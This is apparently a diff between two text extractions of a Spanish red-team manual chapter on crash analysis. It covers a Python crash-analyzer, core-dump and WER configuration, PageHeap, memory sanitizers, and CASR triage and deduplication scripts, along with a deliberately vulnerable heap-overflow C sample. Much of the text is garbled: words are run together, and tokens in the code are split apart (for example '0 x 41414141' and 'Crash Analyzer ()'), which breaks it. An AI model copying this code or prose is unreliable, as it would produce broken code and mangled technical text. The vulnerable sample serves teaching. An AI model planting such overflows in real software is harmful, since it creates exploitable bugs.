 <p>self. crash_info['type'] = "RIP_CORRUPTION"</p>
 <p>self. crash_info['severity'] = "CRITICAL"</p>
-<p>elif 0x41414141 <= rip <= 0x4141414141414141:</p>
+<p>elif 0 x 41414141 <= rip <= 0 x 4141414141414141:</p>
 <p>self. crash_info['type'] = "RIP_CONTROL_PATTERN"</p>
 <p>self. crash_info['severity'] = "CRITICAL"</p>
 <p>else:</p>
 <p>self. crash_info['type'] = "MEMORY_CORRUPTION"</p>
 <p>self. crash_info['severity'] = "HIGH"</p>
-<p>def _print_report(self):</p>
-<p>print("\n" + "="*60)</p>
-<p>print("CRASH ANALYSIS REPORT")</p>
-<p>print("="*60)</p>
-<p>print(f"Type: {self. crash_info. get('type', 'UNKNOWN')}")</p>
-<p>print(f"Severity: {self. crash_info. get('severity', 'UNKNOWN')}")</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>print(f"RIP: 0x{self. crash_info. get('rip', 0):x}")</p>
-<p>print(f"RSP: 0x{self. crash_info. get('rsp', 0):x}")</p>
-<p>print(f"Signal: {self. crash_info. get('signal', 'UNKNOWN')}")</p>
-<p>print("-"*60)</p>
-<p>print("BACKTRACE:")</p>
-<p>print(self. crash_info. get('backtrace', 'N/A'))</p>
-<p>print("="*60)</p>
+<p>def _print_report (self):</p>
+<p>print ("\n" + "="*60)</p>
+<p>print ("CRASH ANALYSIS REPORT")</p>
+<p>print ("="*60)</p>
+<p>print (f"Type: {self. crash_info. get ('type', 'UNKNOWN')}")</p>
+<p>print (f"Severity: {self. crash_info. get ('severity', 'UNKNOWN')}")</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>print (f"RIP: 0 x{self. crash_info. get ('rip', 0): x}")</p>
+<p>print (f"RSP: 0 x{self. crash_info. get ('rsp', 0): x}")</p>
+<p>print (f"Signal: {self. crash_info. get ('signal', 'UNKNOWN')}")</p>
+<p>print ("-"*60)</p>
+<p>print ("BACKTRACE:")</p>
+<p>print (self. crash_info. get ('backtrace', 'N/A'))</p>
+<p>print ("="*60)</p>
 <h1>Ejecutar análisis</h1>
 <p>if __name__ == "__main__":</p>
-<p>analyzer = CrashAnalyzer()</p>
-<p>analyzer. analyze()</p>
+<p>analyzer = Crash Analyzer ()</p>
+<p>analyzer. analyze ()</p>
 <ol>
   <li>2.3. 4. 2.3 Colección de Dumps</li>
 </ol>
-<p>Windows - Windows Error Reporting (WER) y ProcDump:</p>
+<p>Windows - Windows Error Reporting (WER) y Proc Dump:</p>
 <h1>Configurar WER para guardar dumps</h1>
-<p>reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpFolder /t REG_EXPAND_SZ /d "C:\CrashDumps" /f</p>
-<p>reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\LocalDumps" /v DumpType /t REG_DWORD /d 2 /f</p>
-<h1>Usar ProcDump para captura específica</h1>
-<h1>Descargar de: https://docs. microsoft. com/en-us/sysinternals/downloads/procdump</h1>
+<p>reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Local Dumps" /v Dump Folder /t REG_EXPAND_SZ /d "C:\Crash Dumps" /f</p>
+<p>reg add "HKLM\SOFTWARE\Microsoft\Windows\Windows Error Reporting\Local Dumps" /v Dump Type /t REG_DWORD /d 2 /f</p>
+<h1>Usar Proc Dump para captura específica</h1>
+<h1>Descargar de: <a href="https://docs." target="_blank">https://docs.</a> microsoft. com/en-us/sysinternals/downloads/procdump</h1>
 <h1>Capturar dump en crash</h1>
 <p>procdump -e -ma target. exe -o C:\Dumps</p>
 <h1>Capturar dump en excepción específica</h1>
@@ -719,49 +719,49 @@
 <p>cat /proc/sys/kernel/core_pattern</p>
 <p>ulimit -c</p>
 <h1>Configuración persistente</h1>
-<p>echo "kernel. core_pattern=/var/crash/core.%e.%p.%t" | sudo tee -a /etc/sysctl. conf</p>
+<p>echo "kernel. core_pattern=/var/crash/core.% e.% p.% t" | sudo tee -a /etc/sysctl. conf</p>
 <p>sudo sysctl -p</p>
 <h1>Para systemd-coredump</h1>
 <p>sudo apt install systemd-coredump</p>
-<p>echo "kernel. core_pattern=|/lib/systemd/systemd-coredump%P%u%g%s%t%c%h" | sudo tee /etc/sysctl. d/50-coredump. conf</p>
+<p>echo "kernel. core_pattern=|/lib/systemd/systemd-coredump% P% u% g% s% t% c% h" | sudo tee /etc/sysctl. d/50-coredump. conf</p>
 <h1>Listar cores con coredumpctl</h1>
 <p>coredumpctl list</p>
 <p>coredumpctl info MATCH</p>
 <p>coredumpctl debug MATCH # Abre GDB directamente</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <h1>Script de batch collection</h1>
 <p>for input in crashes/*; do</p>
 <p>timeout 5 ./target "$input" || {</p>
-<p>mv core.* "cores/$(basename $input).core" 2>/dev/null</p>
+<p>mv core.* "cores/$(basename $input). core" 2>/dev/null</p>
 <p>done</p>
 <ol>
-  <li>2.4. 4. 2.4 PageHeap y AppVerifier (Windows)</li>
+  <li>2.4. 4. 2.4 Page Heap y App Verifier (Windows)</li>
 </ol>
-<p>PageHeapcolocapáginasdeguardaalrededordeallocacionesparadetectarheapoverflowsinme-</p>
+<p>Page Heapcolocapáginasdeguardaalrededordeallocacionesparadetectarheapoverflowsinme-</p>
 <p>diatamente.</p>
-<h1>Habilitar PageHeap para un ejecutable</h1>
+<h1>Habilitar Page Heap para un ejecutable</h1>
 <p>gflags /p /enable target. exe /full</p>
 <h1>Verificar estado</h1>
 <p>gflags /p</p>
 <h1>Deshabilitar</h1>
 <p>gflags /p /disable target. exe</p>
-<h1>Con AppVerifier (GUI más completo)</h1>
+<h1>Con App Verifier (GUI más completo)</h1>
 <p>appverif. exe</p>
 <h1>Agregar aplicación → Seleccionar checks (Heaps, Handles, Locks)</h1>
-<p>Ejemplo de Detección con PageHeap:</p>
-<p>// heap_vuln. c - Heap overflow detectable con PageHeap</p>
+<p>Ejemplo de Detección con Page Heap:</p>
+<p>// heap_vuln. c - Heap overflow detectable con Page Heap</p>
 <p>#include <windows. h></p>
 <p>#include <stdio. h></p>
-<p>int main() {</p>
-<p>char *buf = (char*)HeapAlloc(GetProcessHeap(), 0, 16);</p>
-<p>printf("[*] Allocated 16 bytes at %p\n", buf);</p>
-<p>// Este overflow es detectado INMEDIATAMENTE con PageHeap</p>
-<p>strcpy(buf, "AAAAAAAAAAAAAAAAAAAAAAAAA"); // 25 bytes > 16</p>
-<p>HeapFree(GetProcessHeap(), 0, buf);</p>
+<p>int main () {</p>
+<p>char *buf = (char*) Heap Alloc (Get Process Heap (), 0, 16);</p>
+<p>printf ("[*] Allocated 16 bytes at % p\n", buf);</p>
+<p>// Este overflow es detectado INMEDIATAMENTE con Page Heap</p>
+<p>strcpy (buf, "AAAAAAAAAAAAAAAAAAAAAAAAA"); // 25 bytes > 16</p>
+<p>Heap Free (Get Process Heap (), 0, buf);</p>
 <p>return 0;</p>
-<p>Sin PageHeap: El overflow corrompe silenciosamente el heap. Con PageHeap: Crash inmediato</p>
-<p>enSTATUS_ACCESS_VIOLATIONalescribirmásalládelbuffer.</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>Sin Page Heap: El overflow corrompe silenciosamente el heap. Con Page Heap: Crash inmediato</p>
+<p>en STATUS_ACCESS_VIOLATIO Nalescribirmásalládelbuffer.</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <ol>
   <li>3. 4. 3 Sanitizadores de Memoria</li>
 </ol>
@@ -769,10 +769,10 @@
 <p>ejecución. Son esenciales para análisis de crashes porque convierten bugs silenciosos en crashes</p>
 <p>informativos.</p>
 <ol>
-  <li>3.1. 4. 3.1 AddressSanitizer (ASAN)</li>
+  <li>3.1. 4. 3.1 Address Sanitizer (ASAN)</li>
 </ol>
 <p>ASAN es el sanitizer más importante para análisis de seguridad. Detecta múltiples clases de bugs</p>
-<p>conoverheadmoderado(~2xslowdown).</p>
+<p>conoverheadmoderado(~2 xslowdown).</p>
 <p>Compilación con ASAN:</p>
 <h1>GCC</h1>
 <p>gcc -g -O1 -fsanitize=address -fno-omit-frame-pointer source. c -o target_asan</p>
@@ -801,59 +801,59 @@
 <p>stack-buffer-overflow Overflowdebufferenstack char buf[10]; buf[20]=0;</p>
 <p>global-buffer- Overflowdevariableglobal Similar</p>
 <p>overflow</p>
-<p>heap-use-after-free Accesoamemorialiberada free(p); *p=0;</p>
+<p>heap-use-after-free Accesoamemorialiberada free (p); *p=0;</p>
 <p>stack-use-after-return Accesoastackdespuésdereturn Punteroalocalescapado</p>
 <p>stack-use-after-scope Accesofueradelscope Variablelocalfuerade</p>
 <p>bloque</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>Error Descripción Ejemplo</p>
-<p>double-free Liberarmemoriadosveces free(p); free(p);</p>
-<p>alloc-dealloc- malloc/deleteonew/free free(new int)</p>
+<p>double-free Liberarmemoriadosveces free (p); free (p);</p>
+<p>alloc-dealloc- malloc/deleteonew/free free (new int)</p>
 <p>mismatch</p>
-<p>SEGVonunknown Crashendireccióninválida NULLderef</p>
+<p>SEG Vonunknown Crashendireccióninválida NUL Lderef</p>
 <p>address</p>
 <p>Ejemplo de Reporte ASAN (Heap Buffer Overflow):</p>
 <p>=================================================================</p>
-<p>==12345==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000000050</p>
-<p>READ of size 1 at 0x602000000050 thread T0</p>
-<p>#0 0x4011a3 in heap_overflow /home/user/vulnerable_suite. c:18:5</p>
-<p>#1 0x4012b8 in main /home/user/vulnerable_suite. c:45:9</p>
-<p>#2 0x7f... in __libc_start_main</p>
-<p>0x602000000050 is located 0 bytes to the right of 32-byte region [0x602000000030,0x602000000050)</p>
+<p>==12345==ERROR: Address Sanitizer: heap-buffer-overflow on address 0 x 602000000050</p>
+<p>READ of size 1 at 0 x 602000000050 thread T0</p>
+<p>#0 0 x 4011 a 3 in heap_overflow /home/user/vulnerable_suite. c:18:5</p>
+<p>#1 0 x 4012 b 8 in main /home/user/vulnerable_suite. c:45:9</p>
+<p>#2 0 x 7 f... in __libc_start_main</p>
+<p>0 x 602000000050 is located 0 bytes to the right of 32-byte region [0 x 602000000030,0 x 602000000050)</p>
 <p>allocated by thread T0 here:</p>
-<p>#0 0x7f... in malloc</p>
-<p>#1 0x401156 in heap_overflow /home/user/vulnerable_suite. c:15:17</p>
-<p>SUMMARY: AddressSanitizer: heap-buffer-overflow /home/user/vulnerable_suite. c:18:5 in heap_overflow</p>
+<p>#0 0 x 7 f... in malloc</p>
+<p>#1 0 x 401156 in heap_overflow /home/user/vulnerable_suite. c:15:17</p>
+<p>SUMMARY: Address Sanitizer: heap-buffer-overflow /home/user/vulnerable_suite. c:18:5 in heap_overflow</p>
 <p>Interpretando Shadow Memory:</p>
-<p>ASANusa“shadowmemory”pararastrearelestadodecadabyte:</p>
+<p>ASA Nusa“shadowmemory”pararastrearelestadodecadabyte:</p>
 <p>Shadow byte legend:</p>
 <p>Addressable: 00</p>
 <p>Partially addressable: 01 02 03 04 05 06 07</p>
 <p>Heap left redzone: fa</p>
 <p>Freed heap region: fd</p>
-<p>Stack left redzone: f1</p>
-<p>Stack mid redzone: f2</p>
-<p>Stack right redzone: f3</p>
-<p>Stack after return: f5</p>
-<p>Stack use after scope: f8</p>
-<p>Global redzone: f9</p>
-<p>Global init order: f6</p>
-<p>Poisoned by user: f7</p>
+<p>Stack left redzone: f 1</p>
+<p>Stack mid redzone: f 2</p>
+<p>Stack right redzone: f 3</p>
+<p>Stack after return: f 5</p>
+<p>Stack use after scope: f 8</p>
+<p>Global redzone: f 9</p>
+<p>Global init order: f 6</p>
+<p>Poisoned by user: f 7</p>
 <p>Container overflow: fc</p>
 <p>Array cookie: ac</p>
 <p>Intra object redzone: bb</p>
-<p>ASan internal: fe</p>
+<p>A San internal: fe</p>
 <p>Left alloca redzone: ca</p>
 <p>Right alloca redzone: cb</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <ol>
-  <li>3.2. 4. 3.2 UndefinedBehaviorSanitizer (UBSAN)</li>
+  <li>3.2. 4. 3.2 Undefined Behavior Sanitizer (UBSAN)</li>
 </ol>
-<p>UBSANdetectacomportamientoindefinidoenC/C++quepuedecausarbugssutiles.</p>
+<p>UBSA Ndetectacomportamientoindefinidoen C/C++quepuedecausarbugssutiles.</p>
 <h1>Compilación con UBSAN</h1>
 <p>gcc -g -O1 -fsanitize=undefined source. c -o target_ubsan</p>
 <h1>Combinado con ASAN (recomendado)</h1>
-<p>gcc -g -O1 -fsanitize=address,undefined source. c -o target_asan_ubsan</p>
+<p>gcc -g -O1 -fsanitize=address, undefined source. c -o target_asan_ubsan</p>
 <p>Errores Detectados:</p>
 <p>// signed-integer-overflow</p>
 <p>int a = INT_MAX;</p>
@@ -864,51 +864,51 @@
 <p>// shift-out-of-bounds</p>
 <p>int x = 1 << 33; // UBSAN: shift exponent 33 is too large</p>
 <p>// float-cast-overflow</p>
-<p>double d = 1e100;</p>
-<p>int i = (int)d; // UBSAN: value cannot be represented</p>
+<p>double d = 1 e 100;</p>
+<p>int i = (int) d; // UBSAN: value cannot be represented</p>
 <ol>
-  <li>3.3. 4. 3.3 MemorySanitizer (MSAN)</li>
+  <li>3.3. 4. 3.3 Memory Sanitizer (MSAN)</li>
 </ol>
-<p>MSANdetectalecturasdememorianoinicializada(soloClang).</p>
+<p>MSA Ndetectalecturasdememorianoinicializada(solo Clang).</p>
 <h1>Requiere Clang y libc++ instrumentada</h1>
 <p>clang -g -O1 -fsanitize=memory -fno-omit-frame-pointer source. c -o target_msan</p>
 <p>Ejemplo de Error:</p>
-<p>int main() {</p>
+<p>int main () {</p>
 <p>int x; // No inicializada</p>
 <p>if (x) // MSAN: use-of-uninitialized-value</p>
-<p>printf("branch taken\n");</p>
+<p>printf ("branch taken\n");</p>
 <p>return 0;</p>
 <ol>
-  <li>3.4. 4. 3.4 ThreadSanitizer (TSAN)</li>
+  <li>3.4. 4. 3.4 Thread Sanitizer (TSAN)</li>
 </ol>
-<p>TSANdetectadataracesydeadlocksenprogramasmulti-hilo.</p>
+<p>TSA Ndetectadataracesydeadlocksenprogramasmulti-hilo.</p>
 <h1>Compilación con TSAN</h1>
 <p>gcc -g -O1 -fsanitize=thread source. c -lpthread -o target_tsan</p>
 <p>Ejemplo de Data Race:</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>#include <pthread. h></p>
 <p>int counter = 0;</p>
-<p>void* increment(void* arg) {</p>
+<p>void* increment (void* arg) {</p>
 <p>for (int i = 0; i < 1000000; i++)</p>
 <p>counter++; // TSAN: data race</p>
 <p>return NULL;</p>
-<p>int main() {</p>
-<p>pthread_t t1, t2;</p>
-<p>pthread_create(&t1, NULL, increment, NULL);</p>
-<p>pthread_create(&t2, NULL, increment, NULL);</p>
-<p>pthread_join(t1, NULL);</p>
-<p>pthread_join(t2, NULL);</p>
+<p>int main () {</p>
+<p>pthread_t t 1, t 2;</p>
+<p>pthread_create (&t 1, NULL, increment, NULL);</p>
+<p>pthread_create (&t 2, NULL, increment, NULL);</p>
+<p>pthread_join (t 1, NULL);</p>
+<p>pthread_join (t 2, NULL);</p>
 <p>return 0;</p>
-<p>ReporteTSAN:</p>
-<p>WARNING: ThreadSanitizer: data race</p>
-<p>Write of size 4 at 0x... by thread T1:</p>
-<p>#0 increment source. c:7 (target_tsan+0x...)</p>
-<p>Previous write of size 4 at 0x... by thread T2:</p>
-<p>#0 increment source. c:7 (target_tsan+0x...)</p>
+<p>Reporte TSAN:</p>
+<p>WARNING: Thread Sanitizer: data race</p>
+<p>Write of size 4 at 0 x... by thread T1:</p>
+<p>#0 increment source. c:7 (target_tsan+0 x...)</p>
+<p>Previous write of size 4 at 0 x... by thread T2:</p>
+<p>#0 increment source. c:7 (target_tsan+0 x...)</p>
 <ol>
   <li>3.5. 4. 3.5 Matriz de Compatibilidad de Sanitizers</li>
 </ol>
-<p>Sanitizer GCC Clang MSVC Linux Windows macOS</p>
+<p>Sanitizer GCC Clang MSVC Linux Windows mac OS</p>
 <h2>ASAN ￿ ￿ ￿ ￿ ￿ ￿</h2>
 <h2>UBSAN ￿ ￿ ￿ ￿ ￿ ￿</h2>
 <h2>MSAN ￿ ￿ ￿ ￿ ￿ ￿</h2>
@@ -916,24 +916,24 @@
 <p>Combinaciones Válidas:</p>
 <p>Combinación Válida Uso</p>
 <p>ASAN+UBSAN ￿ Triagedefuzzinggeneral</p>
-<p>ASAN+LSAN ￿ IncluidopordefectoconASAN</p>
+<p>ASAN+LSAN ￿ Incluidopordefectocon ASAN</p>
 <p>ASAN+MSAN ￿ Incompatibles</p>
 <p>ASAN+TSAN ￿ Incompatibles</p>
 <p>MSAN+UBSAN ￿ Bugsdeinicialización</p>
 <p>TSAN+UBSAN ￿ Bugsdeconcurrencia</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <ol>
-  <li>3.6. 4. 3.6 GWP-ASan para Producción</li>
+  <li>3.6. 4. 3.6 GWP-A San para Producción</li>
 </ol>
-<p>GWP-ASan (Google-Wide Performance-safe ASan) es un sampling allocator que detecta bugs de</p>
+<p>GWP-A San (Google-Wide Performance-safe A San) es un sampling allocator que detecta bugs de</p>
 <p>memoriaenproducciónconoverheadmínimo(~1-2%).</p>
 <p>// Integración en Android (automática en Android 11+)</p>
 <p>// En Linux, usar con jemalloc o tcmalloc</p>
 <p>// Configurar sampling rate</p>
 <p>export GWP_ASAN_SAMPLE_RATE=5000 // 1 de cada 5000 allocations</p>
 <p>// Ejemplo de crash en producción</p>
-<p>==12345==ERROR: GWP-ASan detected a memory error</p>
-<p>Use-after-free at 0x7f1234567890</p>
+<p>==12345==ERROR: GWP-A San detected a memory error</p>
+<p>Use-after-free at 0 x 7 f 1234567890</p>
 <p>Allocation stack:</p>
 <p>#0 malloc ...</p>
 <p>#1 create_widget app. c:42</p>
@@ -951,21 +951,21 @@
 <p>│ └──► Bugs de concurrencia ──────► TSAN + UBSAN │</p>
 <p>│ │ │</p>
 <p>│ └──► Bugs de inicialización ──► MSAN + UBSAN │</p>
-<p>│ Producción ─────────────► GWP-ASan (sampling) │</p>
+<p>│ Producción ─────────────► GWP-A San (sampling) │</p>
 <p>│ Kernel Linux ───────────► KASAN / KMSAN / KCSAN │</p>
 <p>└──────────────────────────────────────────────────────────────┘</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <ol>
   <li>4. 4. 4 Clasificación y Triage Automatizado</li>
   <li>4.1. 4. 4.1 CASR - Crash Analysis and Severity Reporter</li>
 </ol>
-<p>CASResunasuitedeherramientasparaclasificaciónautomatizadadecrashes,desarrolladaporISP</p>
+<p>CAS Resunasuitedeherramientasparaclasificaciónautomatizadadecrashes, desarrolladapor ISP</p>
 <h2>RAS.</h2>
 <p>Instalación:</p>
 <h1>Desde crates. io (Rust)</h1>
 <p>cargo install casr</p>
 <h1>O desde source</h1>
-<p>git clone https://github. com/ispras/casr</p>
+<p>git clone <a href="https://github." target="_blank">https://github.</a> com/ispras/casr</p>
 <p>cd casr</p>
 <p>cargo build --release</p>
 <p>sudo cp target/release/casr-* /usr/local/bin/</p>
@@ -978,71 +978,71 @@
 <p>Uso de CASR para Triage:</p>
 <p>cd ~/crash_analysis_lab</p>
 <h1>1. Generar reporte para crash individual (con ASAN)</h1>
-<p>casr-san -o crash. casrep -- ./vuln_asan 1 "$(python3 -c 'print(\"A\"*100)')"</p>
+<p>casr-san -o crash. casrep -- ./vuln_asan 1 "$(python 3 -c 'print (\"A\"*100)')"</p>
 <h1>2. Generar reporte sin sanitizers (usa GDB)</h1>
-<p>casr-gdb -o crash_gdb. casrep -- ./vuln_no_protect 1 "$(python3 -c 'print(\"A\"*100)')"</p>
+<p>casr-gdb -o crash_gdb. casrep -- ./vuln_no_protect 1 "$(python 3 -c 'print (\"A\"*100)')"</p>
 <h1>3. Procesar corpus de crashes de fuzzer</h1>
 <p>mkdir -p casrep_out</p>
 <p>for crash in crashes/*; do</p>
 <p>name=$(basename "$crash")</p>
-<p>casr-san -o "casrep_out/${name}.casrep" -- ./target_asan "$(cat $crash)" 2>/dev/null || true</p>
+<p>casr-san -o "casrep_out/${name}. casrep" -- ./target_asan "$(cat $crash)" 2>/dev/null || true</p>
 <p>done</p>
 <h1>4. Clustering de crashes</h1>
 <p>casr-cluster -c casrep_out/ deduped_out/</p>
 <h1>5. Ver resumen de clusters</h1>
 <p>for cluster in deduped_out/cl*; do</p>
-<p>count=$(ls -1 "$cluster"/*.casrep 2>/dev/null | wc -l)</p>
-<p>first=$(ls "$cluster"/*.casrep 2>/dev/null | head -1)</p>
+<p>count=$(ls -1 "$cluster"/*. casrep 2>/dev/null | wc -l)</p>
+<p>first=$(ls "$cluster"/*. casrep 2>/dev/null | head -1)</p>
 <p>if [ -f "$first" ]; then</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
-<p>severity=$(jq -r '.CrashSeverity. Type' "$first")</p>
-<p>desc=$(jq -r '.CrashSeverity. ShortDescription' "$first")</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
+<p>severity=$(jq -r '. Crash Severity. Type' "$first")</p>
+<p>desc=$(jq -r '. Crash Severity. Short Description' "$first")</p>
 <p>echo "$(basename $cluster): $count crashes - $severity - $desc"</p>
 <p>done</p>
-<p>Estructura de Reporte CASR (.casrep):</p>
-<p>"CrashSeverity": {</p>
+<p>Estructura de Reporte CASR (. casrep):</p>
+<p>"Crash Severity": {</p>
 <p>"Type": "EXPLOITABLE",</p>
-<p>"ShortDescription": "heap-buffer-overflow(write)",</p>
+<p>"Short Description": "heap-buffer-overflow (write)",</p>
 <p>"Description": "Write to heap buffer out of bounds"</p>
 <p>"Stacktrace": [</p>
-<p>"#0 0x401156 in heap_overflow vulnerable_suite. c:18",</p>
-<p>"#1 0x4012b8 in main vulnerable_suite. c:45",</p>
-<p>"#2 0x7f... in __libc_start_main"</p>
-<p>"CrashLine": "vulnerable_suite. c:18",</p>
-<p>"ExecutionClass": {</p>
-<p>"FaultAddress": "0x602000000050",</p>
-<p>"AccessType": "WRITE"</p>
-<p>"AsanReport": {</p>
-<p>"ErrorType": "heap-buffer-overflow",</p>
-<p>"AccessSize": 1,</p>
-<p>"AccessAddress": "0x602000000050"</p>
+<p>"#0 0 x 401156 in heap_overflow vulnerable_suite. c:18",</p>
+<p>"#1 0 x 4012 b 8 in main vulnerable_suite. c:45",</p>
+<p>"#2 0 x 7 f... in __libc_start_main"</p>
+<p>"Crash Line": "vulnerable_suite. c:18",</p>
+<p>"Execution Class": {</p>
+<p>"Fault Address": "0 x 602000000050",</p>
+<p>"Access Type": "WRITE"</p>
+<p>"Asan Report": {</p>
+<p>"Error Type": "heap-buffer-overflow",</p>
+<p>"Access Size": 1,</p>
+<p>"Access Address": "0 x 602000000050"</p>
 <ol>
   <li>4.2. 4. 4.2 Clases de Severidad de CASR</li>
 </ol>
-<p>CASRclasificacrashesen23clasesdeseveridad:</p>
+<p>CAS Rclasificacrashesen 23 clasesdeseveridad:</p>
 <p>Clase Tipo Descripción</p>
 <h2>EXPLOITABLE</h2>
-<p>SegFaultOnPc E SIGSEGVconPCcorrompido</p>
-<p>ReturnAv E Violacióndeaccesoenreturn</p>
-<p>BranchAv E Violacióndeaccesoenbranch</p>
-<p>CallAv E Violacióndeaccesoencall</p>
-<p>DestAv E Violacióndeaccesoenescritura</p>
-<p>heap-buffer-overflow(write) E ASAN:overflowdeheapescritura</p>
-<p>stack-buffer-overflow(write) E ASAN:overflowdestackescritura</p>
-<p>heap-use-after-free(write) E ASAN:UAFescritura</p>
+<p>Seg Fault On Pc E SIGSEG Vcon P Ccorrompido</p>
+<p>Return Av E Violacióndeaccesoenreturn</p>
+<p>Branch Av E Violacióndeaccesoenbranch</p>
+<p>Call Av E Violacióndeaccesoencall</p>
+<p>Dest Av E Violacióndeaccesoenescritura</p>
+<p>heap-buffer-overflow(write) E ASAN: overflowdeheapescritura</p>
+<p>stack-buffer-overflow(write) E ASAN: overflowdestackescritura</p>
+<p>heap-use-after-free(write) E ASAN: UA Fescritura</p>
 <h2>PROBABLY_EXPLOITABLE</h2>
-<p>SourceAv PE Violacióndeaccesoenlectura</p>
-<p>SegFaultOnPcNearNull PE SIGSEGVenPCcercadeNULL</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>Source Av PE Violacióndeaccesoenlectura</p>
+<p>Seg Fault On Pc Near Null PE SIGSEG Ven P Ccercade NULL</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <p>Clase Tipo Descripción</p>
-<p>DestAvNearNull PE EscrituracercadeNULLmapping</p>
-<p>heap-buffer-overflow(read) PE ASAN:overflowdeheaplectura</p>
-<p>heap-use-after-free(read) PE ASAN:UAFlectura</p>
+<p>Dest Av Near Null PE Escrituracercade NUL Lmapping</p>
+<p>heap-buffer-overflow(read) PE ASAN: overflowdeheaplectura</p>
+<p>heap-use-after-free(read) PE ASAN: UA Flectura</p>
 <h2>NOT_EXPLOITABLE</h2>
-<p>AbortSignal NE SIGABRT(assertion,abort)</p>
-<p>SafeFunctionCheck NE Stackprotectortriggered</p>
-<p>double-free NE ASAN:doublefree</p>
-<p>SourceAvNearNull NE LecturacercadeNULL</p>
+<p>Abort Signal NE SIGABRT(assertion, abort)</p>
+<p>Safe Function Check NE Stackprotectortriggered</p>
+<p>double-free NE ASAN: doublefree</p>
+<p>Source Av Near Null NE Lecturacercade NULL</p>
 <p>alloc-dealloc-mismatch NE malloc/deletemismatch</p>
 <ol>
   <li>4.3. 4. 4.3 Checklist de Triage Rápido</li>
@@ -1073,7 +1073,7 @@
 <p>│ [ ] Stack Canary: ON/OFF │</p>
 <h2>│ [ ] PIE: ON/OFF │</h2>
 <p>│ [ ] RELRO: Full/Partial/No │</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <h2>│ [ ] CFI: ON/OFF │</h2>
 <p>│ [ ] CET (Intel): ON/OFF │</p>
 <h2>│ 5. ALCANZABILIDAD │</h2>
@@ -1086,11 +1086,11 @@
 <h1>Linux con checksec de pwntools</h1>
 <p>checksec --file ./target</p>
 <h1>Salida típica:</h1>
-<h1>Arch: amd64-64-little</h1>
+<h1>Arch: amd 64-64-little</h1>
 <h1>RELRO: Partial RELRO</h1>
 <h1>Stack: No canary found</h1>
 <h1>NX: NX enabled</h1>
-<h1>PIE: No PIE (0x400000)</h1>
+<h1>PIE: No PIE (0 x 400000)</h1>
 <h1>Windows con winchecksec</h1>
 <p>winchecksec. exe target. exe</p>
 <h1>Verificar CET (Intel Control-flow Enforcement Technology)</h1>
@@ -1102,7 +1102,7 @@
 </ol>
 <p>Cuando un fuzzer produce miles de crashes, la deduplicación es esencial para enfocarse en bugs</p>
 <p>únicos.</p>
-<p>Método1: Hash de Stack Trace</p>
+<p>Método 1: Hash de Stack Trace</p>
 <p>#!/bin/bash</p>
 <h1>dedupe_by_stack. sh - Deduplicación por hash de top 3 frames</h1>
 <p>CRASHES_DIR="crashes"</p>
@@ -1110,16 +1110,16 @@
 <p>mkdir -p "$DEDUPED_DIR"</p>
 <p>declare -A seen_hashes</p>
 <p>for crash in "$CRASHES_DIR"/*; do</p>
-<p>CAPÍTULO5. ANÁLISISDECRASHES BitácoraRedTeam</p>
+<p>CAPÍTULO5. ANÁLISISDECRASHES Bitácora Red Team</p>
 <h1>Ejecutar y capturar backtrace</h1>
 <p>bt=$(gdb -q -batch \</p>
 <p>-ex "run" \</p>
 <p>-ex "bt 3" \</p>
 <p>--args ./target_asan "$(cat $crash)" 2>&1 | grep -E "^#[0-3]")</p>
 <h1>Normalizar (remover direcciones, solo funciones)</h1>
-<p>normalized=$(echo "$bt" | sed 's/0x[0-9a-f]*//g' | tr -d ' \n')</p>
+<p>normalized=$(echo "$bt" | sed 's/0 x[0-9 a-f]*//g' | tr -d ' \n')</p>
 <h1>Hash</h1>
-<p>hash=$(echo "$normalized" | md5sum | cut -d' ' -f1)</p>
+<p>hash=$(echo "$normalized" | md 5 sum | cut -d' ' -f 1)</p>
 <p>if [[ -z "${seen_hashes[$hash]}" ]]; then</p>
 <p>seen_hashes[$hash]=1</p>
 <p>cp "$crash" "$DEDUPED_DIR/"</p>
@@ -1128,7 +1128,7 @@
 <p>echo "DUPE: $(basename $crash)"</p>
 <p>done</p>
 <p>echo "Reduced $(ls $CRASHES_DIR | wc -l) crashes to $(ls $DEDUPED_DIR | wc -l) unique"</p>
-<p>Método2: Deduplicación por Cobertura</p>
+<p>Método 2: Deduplicación por Cobertura</p>
 <p>#!/bin/bash</p>
 <h1>dedupe_by_coverage. sh - Usa afl-showmap para deduplicar por cobertura</h1>
 <p>AFL_PATH="/usr/local/bin"</p>
@@ -1140,13 +1140,13 @@
